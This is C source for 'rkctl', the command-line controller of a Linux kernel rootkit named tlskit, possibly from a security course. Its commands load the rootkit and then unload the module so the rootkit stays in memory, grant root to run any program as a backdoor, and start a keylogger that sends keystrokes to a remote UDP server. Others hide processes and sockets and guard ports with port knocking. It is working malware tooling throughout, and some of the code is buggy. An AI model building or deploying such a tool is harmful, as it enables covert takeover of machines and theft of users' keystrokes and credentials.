#include "shared.h"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>

int do_ioctl_request(const char *desc, unsigned int request, void *data) {

    int fd;
    printf("[ ] rkctl-do_ioctl_request: %s\n", desc);

    if (0 > (fd = open(IOCTL_FILE_PATH, O_RDWR))) {
        printf("[-] rkctl-do_ioctl_request: Cannot open control file for ioctl\n");
        return -1;
    }

    if (0 > ioctl(fd, request, data)) {
        perror("[-] rkctl-do_ioctl_request: ioctl() failed");
        return -1;
    }

    close(fd);

    printf("[+] rkctl-do_ioctl_request: Done.\n");
    return 0;
}

int do_load(int argc, const char *argv[]) {

    const char *path;
    char *command;
    unsigned int len;

    printf("[ ] rkctl: load tlskit ...\n");

    /*
     * Check some conditions: root, args, not yet loaded
     */
    if (argc != 3) {
        printf("[-] rkctl: Wrong number of arguments\n");
        return -1;
    }

    if (geteuid() != 0) {
        printf("[-] rkctl: load must be run as root\n");
        return -1;
    }

    printf("[ ] rkctl: Check if tlskit is already installed ... (expect failure)\n");
    if (0 == do_ioctl_request("Ping", RKCTL_PING, NULL)) {
        printf("[-] rkctl: tlskit has already been loaded\n");
        return -1;
    }

    /*
     * Build command string
     */
    path = argv[2];
    len = strlen("insmod ") + strlen(path) + 1;
    if (NULL == (command = malloc(len))) {
        printf("[-] rkctl: cannot allocate memory\n");
        return -1;
    }

    memset(command, 0, sizeof(command));
    memcpy(command, "insmod ", strlen("insmod "));
    strcat(command, path);

    /*
     * Load module
     */
    printf("[ ] rkctl: Insert kernel module that will install the tlskit\n");
    if (0 > system(command)) {
        printf("[-] rkctl: cannot insert rootkit\n");
        goto err;
    }

    /*
     * Unload the module again, while the rootkit stays in the memory
     */
    len = strlen("rmmod ") + 1 + strlen(MODULE_NAME);
    if (sizeof(command) < len) {
        command = realloc(command, len);
        if (command == NULL) {
            goto err;
        }
    }
    memset(command, 0, sizeof(command));
    memcpy(command, "rmmod ", strlen("rmmod "));
    strcat(command, MODULE_NAME);

    /*
     * Unload module
     */
    printf("[ ] rkctl: Unload the kernel module\n");
    if (0 > system(command)) {
        printf("[-] rkctl: cannot remove kernel module\n");
        goto err;
    }

    printf("[+] rkctl: Done\n");

    return 0;

err:
    free(command);
    return -1;
}

int do_backdoor(int argc, const char *argv[]) {

    const char *cmd;

    if (argc < 3) {
        printf("[-] rkctl: missing command for execv\n");
        return -1;
    }

    /*
     * Request root credentials
     */
    if (0 != do_ioctl_request("backdoor", RKCTL_BACKDOOR, NULL) || getuid() != 0) {
        printf("[-] rkctl: privilege escalation failed\n");
        return -1;
    }

    /*
     * Execute command as root, if available
     */
    cmd = argv[2];
    execv(cmd, NULL);

    return 0;
}

int do_start_key_logger(int argc, const char *argv[]) {

    struct sockaddr_in addr;
    char *endptr = NULL;

    if (argc != 4) {
        printf("[-] rkctl: wrong number of arguments\n");
        return -1;
    }

    /*
     * Parse port and ip
     */

    addr.sin_family = AF_INET;
    errno = 0;
    addr.sin_port = htons((unsigned short) strtol(argv[3], &endptr, 0));

    if (errno != 0 || *endptr != 0) {
        printf("[-] rkctl: do_start_key_logger() cannot parse port\n");
        return -1;
    }

    if (!inet_pton(AF_INET, argv[2], &(addr.sin_addr))) {
        printf("[-] rkctl: do_start_key_logger cannot parse ip\n");
        return -1;
    }

    return do_ioctl_request("start_keylogger", RKCTL_START_KEY_LOGGER, (void *) &addr);
}

int do_process_hiding(unsigned int request, int argc, const char *argv[]) {

    pid_t pid;
    char *endptr = NULL;

    if (argc != 3) {
        printf("[-] rkctl: do_process_hiding() missing pid\n");
        return -1;
    }

    /* Parse pid */
    errno = 0;
    pid = (pid_t) strtol(argv[2], &endptr, 0);

    if (errno != 0  || *endptr != 0) {
        printf("[-] rkctl: do_process_hiding() cannot parse pid\n");
        return -1;
    }

    return do_ioctl_request("hidepid", request, (void *) pid);
}

int do_socket_hiding(unsigned int request, int argc, const char *argv[]) {

    unsigned short port;
    char *endptr = NULL;

    if (argc != 3) {
        printf("[-] rkctl: do_socket_hiding() missing port\n");
        return -1;
    }

    /* Parse port */
    errno = 0;
    port = (unsigned short) strtol(argv[2], &endptr, 0);

    if (errno != 0  || *endptr != 0) {
        printf("[-] rkctl: do_socket_hiding() cannot parse port\n");
        return -1;
    }

    return do_ioctl_request("hide_socket", request, (void *) port);

}

int do_port_knocking(unsigned int request, int argc, const char *argv[]) {

    struct hidden_port pk;
    char *endptr = NULL;

    // check parameters
    if (request == RKCTL_HIDE_PORT && argc != 4 || request == RKCTL_UNHIDE_PORT && argc != 3) {
        printf("[-] rkctl: do_port_knocking() invalid number of arguments\n");
        return -1;
    }

    // in both cases we expect a port as first argument
    errno = 0;
    pk.port = (unsigned short) strtol(argv[2], &endptr, 0);

    if (errno != 0 || *endptr != 0) {
        printf("[-] rkctl: do_port_knocking() cannot parse port\n");
        return -1;
    }

    if (request == RKCTL_HIDE_PORT) {

        // get secret
        memset(pk.secret, 0, sizeof(pk.secret));
        memcpy(pk.secret, argv[3], sizeof(pk.secret) - 1);

        return do_ioctl_request("port_knocking_add", request, (void *) &pk);

    } else {

        return do_ioctl_request("port_knocking_rm", request, (void *) pk.port);

    }
}

void print_usage(void) {
    printf("Usage:\n"
           "\t ./rkctl help\t\t\t\t\tShow this help menu.\n"
           "\t ./rkctl ping\t\t\t\t\tCheck if the rootkit is alive\n"
           "\t ./rkctl load <module.ko>\t\t\tLoad the rootkit (requires root)\n"
           "\t ./rkctl unload\t\t\t\t\tUnload the rootkit\n"
           "\t ./rkctl backdoor <program>\t\t\tRun an arbitrary program (e.g. /bin/sh) as root\n"
           "\t ./rkctl keylog_start <ip> <port>\t\tStart a keylogger that sends to a UDP server at <ip>:<port>\n"
           "\t ./rkctl keylog_stop\t\t\t\tStop the current keylogger\n"
           "\t ./rkctl hidepid_add <pid>\t\t\tHide a process and all its children by pid\n"
           "\t ./rkctl hidepid_rm <pid>\t\t\tUnhide a process and all its non-hidden children by pid\n"
           "\t ./rkctl hide_socket <port>\t\t\tHide a socket by its port\n"
           "\t ./rkctl unhide_socket <port>\t\t\tUnhide a socket by its port\n"
           "\t ./rkctl port_knocking_add <port> <secret>\tProtect port by port knocking with secret\n"
           "\t ./rkctl port_knocking_rm <port>\t\tRemove port from port knocking list\n\n");
}

int main(int argc, const char *argv[]) {

    const char *cmd;

    if (argc < 2) {
        printf("[-] rkctl: missing command\n");
        print_usage();
        return -1;
    }

    cmd = argv[1];

    if (!(strcmp(cmd, "help"))) {

        print_usage();
        return 0;

    } else if (!(strcmp(cmd, "ping"))) {

        return do_ioctl_request("ping", RKCTL_PING, NULL);

    } else if (!strcmp(cmd, "load")) {

        return do_load(argc, argv);

    } else if (!strcmp(cmd, "unload")) {

        return do_ioctl_request("unload", RKCTL_UNLOAD, NULL);

    } else if (!strcmp(cmd, "backdoor")) {

        return do_backdoor(argc, argv);

    } else if (!strcmp(cmd, "keylog_start")) {

        return do_start_key_logger(argc, argv);

    } else if (!strcmp(cmd, "keylog_stop")) {

        return do_ioctl_request("stop_keylogger", RKCTL_STOP_KEY_LOGGER, NULL);

    } else if (!strcmp(cmd, "hidepid_add")) {

        return do_process_hiding(RKCTL_HIDE_PID_ADD, argc, argv);

    } else if (!strcmp(cmd, "hidepid_rm")) {

        return do_process_hiding(RKCTL_HIDE_PID_RM, argc, argv);

    } else if (!strcmp(cmd, "hide_socket")) {

        return do_socket_hiding(RKCTL_HIDE_SOCKET, argc, argv);

    } else if (!strcmp(cmd, "unhide_socket")) {

        return do_socket_hiding(RKCTL_UNHIDE_SOCKET, argc, argv);

    } else if (!strcmp(cmd, "port_knocking_add")) {

        return do_port_knocking(RKCTL_HIDE_PORT, argc, argv);

    } else if (!strcmp(cmd, "port_knocking_rm")) {

        return do_port_knocking(RKCTL_UNHIDE_PORT, argc, argv);

    } else {
        printf("[-] rkctl: command not supported\n");
        print_usage();
        return -1;
    }

}
